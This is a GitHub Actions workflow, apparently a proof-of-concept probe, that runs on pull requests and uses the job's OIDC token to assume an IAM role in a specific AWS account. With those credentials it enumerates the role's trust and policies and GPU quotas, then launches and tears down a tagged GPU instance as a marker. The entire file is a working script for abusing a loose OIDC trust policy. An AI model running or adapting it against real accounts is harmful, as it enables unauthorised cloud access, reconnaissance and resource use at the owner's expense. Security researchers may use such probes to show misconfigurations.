name: c211-i122668-prprobe
on:
  pull_request:
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    env:
      ROLE: arn:aws:iam::720528183931:role/Proj-vht-assume-role
      REGION: eu-west-1
      NONCE: i122668pr
    steps:
      - name: OIDC mint, STS assume (pull_request context)
        run: |
          set -uo pipefail
          echo "C211I_START $(date -u +%FT%TZ)"
          RESP=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
          IDTOKEN=$(printf '%s' "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])' 2>/dev/null)
          if [ -z "${IDTOKEN:-}" ]; then echo "C211I_VERDICT=NO_IDTOKEN"; echo "C211I_TOKEN_RESP=$(printf '%s' "$RESP" | head -c 400)"; exit 0; fi
          echo "C211I_IDTOKEN_LEN=${#IDTOKEN}"
          printf '%s' "$IDTOKEN" > /tmp/idtoken.txt
          python3 - <<'PY'
          import sys,json,base64
          t=open('/tmp/idtoken.txt').read().strip()
          p=t.split(".")[1]
          p+="="*(-len(p)%4)
          d=json.loads(base64.urlsafe_b64decode(p))
          for k in ("iss","aud","sub","ref","repository","repository_owner","event_name","job_workflow_ref","actor"):
              if k in d: print("C211I_CLAIM_%s=%s"%(k,d[k]))
          PY
          STS=$(curl -sS -X POST https://sts.amazonaws.com/ \
            --data-urlencode "Action=AssumeRoleWithWebIdentity" \
            --data-urlencode "Version=2011-06-15" \
            --data-urlencode "RoleArn=${ROLE}" \
            --data-urlencode "RoleSessionName=c211-${NONCE}" \
            --data-urlencode "DurationSeconds=3600" \
            --data-urlencode "WebIdentityToken=${IDTOKEN}")
          printf '%s' "$STS" > /tmp/sts.xml
          python3 - <<'PY'
          import re
          x=open('/tmp/sts.xml').read()
          def g(t):
              m=re.search(r'<%s>(.*?)</%s>'%(t,t), x, re.S)
              return m.group(1) if m else ''
          if '<Credentials>' in x:
              with open('/tmp/env.sh','w') as f:
                  f.write('AWS_ACCESS_KEY_ID=%s\n'%g('AccessKeyId'))
                  f.write('AWS_SECRET_ACCESS_KEY=%s\n'%g('SecretAccessKey'))
                  f.write('AWS_SESSION_TOKEN=%s\n'%g('SessionToken'))
              open('/tmp/creds_ok','w').write('1')
              print('C211I_ASSUME=OK')
              print('C211I_ASSUMED_ROLE_ID=%s'%g('AssumedRoleId'))
              print('C211I_ASSUMED_ROLE_ARN=%s'%g('Arn'))
          else:
              c=re.search(r'<Code>(.*?)</Code>', x, re.S); m=re.search(r'<Message>(.*?)</Message>', x, re.S)
              print('C211I_ASSUME=FAIL')
              print('C211I_ERROR_CODE=%s'%(c.group(1) if c else '?'))
              print('C211I_ERROR_MSG=%s'%(m.group(1) if m else x[:1200]))
          print('C211I_STS_XML_REDACTED=%s'%re.sub(r'<Credentials>.*?</Credentials>','<Credentials>[REDACTED]</Credentials>', x, flags=re.S)[:2500].replace('\n',' '))
          PY
          if [ ! -f /tmp/creds_ok ]; then echo "C211I_VERDICT=ASSUME_FAILED"; exit 0; fi
          set -a; . /tmp/env.sh; set +a
          export AWS_DEFAULT_REGION="$REGION"
          export AWS_REGION="$REGION"
          echo "=== tampered-signature control ==="
          python3 - <<'PY' > /tmp/tampered.txt
          t=open('/tmp/idtoken.txt').read().strip()
          new='A' if t[-1]!='A' else 'B'
          open('/tmp/tampered.txt','w').write(t[:-1]+new)
          PY
          TAMPERED=$(cat /tmp/tampered.txt)
          TSTS=$(curl -sS -X POST https://sts.amazonaws.com/ \
            --data-urlencode "Action=AssumeRoleWithWebIdentity" \
            --data-urlencode "Version=2011-06-15" \
            --data-urlencode "RoleArn=${ROLE}" \
            --data-urlencode "RoleSessionName=c211-${NONCE}-tampered" \
            --data-urlencode "WebIdentityToken=${TAMPERED}")
          printf '%s' "$TSTS" > /tmp/tsts.xml
          python3 - <<'PY'
          import re
          x=open('/tmp/tsts.xml').read()
          c=re.search(r'<Code>(.*?)</Code>',x,re.S); m=re.search(r'<Message>(.*?)</Message>',x,re.S)
          print("C211I_TAMPER_CODE=%s"%(c.group(1) if c else "?"))
          print("C211I_TAMPER_MSG=%s"%((m.group(1) if m else x[:400]).replace("\n"," ")))
          PY
          echo "=== identity ==="
          aws sts get-caller-identity --output json || true
          echo "=== role trust / policies (may be denied) ==="
          aws iam get-role --role-name Proj-vht-assume-role --output json 2>&1 | head -c 3000 || true
          echo
          aws iam list-attached-role-policies --role-name Proj-vht-assume-role --output json 2>&1 | head -c 2000 || true
          echo
          echo "=== EC2 GPU quotas (eu-west-1) ==="
          for q in L-DB2E81BA L-3819A6DF L-417A185B L-7212CCBC; do
            echo "-- quota $q --"
            aws service-quotas get-service-quota --service-code ec2 --quota-code "$q" --region "$REGION" --output json 2>&1 | head -c 800 || true
            echo
          done
          echo "=== instance type offerings ==="
          aws ec2 describe-instance-types --region "$REGION" --filters Name=instance-type,Values=g5.xlarge,g6.xlarge,g6e.xlarge,p5.4xlarge,p4d.24xlarge,p5.48xlarge --query 'InstanceTypes[].[InstanceType,GpuInfo.Gpus[0].Name,VCpuInfo.DefaultVCpus]' --output text 2>&1 | head -20 || true
          echo "=== default network ==="
          aws ec2 describe-vpcs --region "$REGION" --filters Name=is-default,Values=true --query 'Vpcs[].[VpcId,CidrBlock]' --output text 2>&1 || true
          SUBNET=$(aws ec2 describe-subnets --region "$REGION" --filters Name=default-for-az,Values=true --query 'Subnets[0].SubnetId' --output text 2>/dev/null || true)
          SG=$(aws ec2 describe-security-groups --region "$REGION" --filters Name=group-name,Values=default --query 'SecurityGroups[0].GroupId' --output text 2>/dev/null || true)
          echo "C211I_SUBNET=$SUBNET C211I_SG=$SG"
          if [ -z "$SUBNET" ] || [ "$SUBNET" = "None" ] || [ -z "$SG" ] || [ "$SG" = "None" ]; then echo "C211I_VERDICT=NO_DEFAULT_NETWORK"; exit 0; fi
          echo "=== resolve GPU AMI ==="
          AMI=$(aws ssm get-parameter --name /aws/service/deeplearning/ami/x86_64/base-oss-nvidia-driver-gpu-amazon-linux-2023/latest/ami-id --region "$REGION" --query 'Parameter.Value' --output text 2>/dev/null || true)
          if [ -z "$AMI" ] || [ "$AMI" = "None" ]; then
            AMI=$(aws ssm get-parameter --name /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64 --region "$REGION" --query 'Parameter.Value' --output text 2>/dev/null || true)
          fi
          echo "C211I_AMI=$AMI"
          if [ -z "$AMI" ] || [ "$AMI" = "None" ]; then echo "C211I_VERDICT=NO_AMI"; exit 0; fi
          cat > /tmp/userdata.sh <<'UD'
          #!/bin/bash
          exec > >(tee /dev/ttyS0) 2>&1
          echo "C211I_USERDATA_START $(date -u +%FT%TZ)"
          for i in $(seq 1 90); do
            NS=$(command -v nvidia-smi 2>/dev/null || true)
            if [ -z "$NS" ]; then
              for c in /usr/bin/nvidia-smi /opt/conda/bin/nvidia-smi; do [ -x "$c" ] && NS="$c"; done
            fi
            if [ -n "$NS" ] && "$NS" -L >/dev/null 2>&1; then
              echo "C211I_NVIDIA_SMI=$NS"
              "$NS" -L
              "$NS" --query-gpu=name,uuid,memory.total,driver_version --format=csv
              break
            fi
            sleep 10
          done
          echo "C211I_USERDATA_DONE"
          UD
          echo "=== DryRun GPU SKUs ==="
          for it in g6.xlarge g5.xlarge g6e.xlarge p5.4xlarge p4d.24xlarge p5.48xlarge; do
            echo "-- dryrun $it --"
            aws ec2 run-instances --dry-run --region "$REGION" --image-id "$AMI" --instance-type "$it" --count 1 --subnet-id "$SUBNET" --security-group-ids "$SG" 2>&1 | tail -2 || true
          done
          echo "=== single on-demand marker attempt ==="
          : > /tmp/launch.json
          for it in g6.xlarge g5.xlarge g6e.xlarge; do
            aws ec2 run-instances --region "$REGION" --image-id "$AMI" --instance-type "$it" --count 1 --subnet-id "$SUBNET" --security-group-ids "$SG" \
              --tag-specifications "ResourceType=instance,Tags=[{Key=c211_nonce,Value=${NONCE}},{Key=Name,Value=c211-${NONCE}-marker}]" \
              --user-data file:///tmp/userdata.sh --output json > /tmp/launch.json 2>/tmp/launch.err || true
            if grep -q InstanceId /tmp/launch.json; then echo "C211I_LAUNCHED_SKU=$it"; break; else echo "C211I_LAUNCH_FAIL_$it=$(tail -c 300 /tmp/launch.err | tr '\n' ' ')"; fi
          done
          IID=$(python3 -c 'import json;d=json.load(open("/tmp/launch.json"));print(d["Instances"][0]["InstanceId"])' 2>/dev/null || true)
          echo "C211I_INSTANCE_ID=${IID:-none}"
          if [ -z "${IID:-}" ]; then echo "C211I_VERDICT=NO_MARKER_LAUNCHED"; exit 0; fi
          for i in $(seq 1 40); do
            ST=$(aws ec2 describe-instances --region "$REGION" --instance-ids "$IID" --query 'Reservations[0].Instances[0].State.Name' --output text 2>/dev/null || echo unknown)
            echo "C211I_STATE=$ST"
            [ "$ST" = "running" ] && break
            sleep 10
          done
          aws ec2 describe-instances --region "$REGION" --instance-ids "$IID" --query 'Reservations[0].Instances[0].{ID:InstanceId,Type:InstanceType,State:State.Name,AZ:Placement.AvailabilityZone,Tags:Tags,IP:PublicIpAddress}' --output json || true
          echo "=== console poll ==="
          for i in $(seq 1 40); do
            aws ec2 get-console-output --region "$REGION" --instance-id "$IID" --output text > /tmp/console.txt 2>/dev/null || true
            if grep -qaE "UUID: GPU-|C211I_USERDATA_DONE" /tmp/console.txt; then break; fi
            sleep 15
          done
          grep -aE "C211I|GPU|NVIDIA|Tesla|A10G|L40S|H100|A100|L4" /tmp/console.txt | tail -40 || true
          echo "=== teardown ==="
          aws ec2 terminate-instances --region "$REGION" --instance-ids "$IID" --output json 2>&1 | head -c 800 || true
          for i in $(seq 1 40); do
            ST=$(aws ec2 describe-instances --region "$REGION" --instance-ids "$IID" --query 'Reservations[0].Instances[0].State.Name' --output text 2>/dev/null || echo absent)
            [ "$ST" = "terminated" ] && break
            [ "$ST" = "absent" ] && break
            sleep 10
          done
          echo "C211I_FINAL_STATE=$ST"
          echo "C211I_SURVIVORS=$(aws ec2 describe-instances --region "$REGION" --filters "Name=tag:c211_nonce,Values=${NONCE}" "Name=instance-state-name,Values=pending,running,stopping,stopped" --query 'length(Reservations[].Instances[])' --output text 2>/dev/null || echo unknown)"
          echo "C211I_VERDICT=MARKER_DONE"
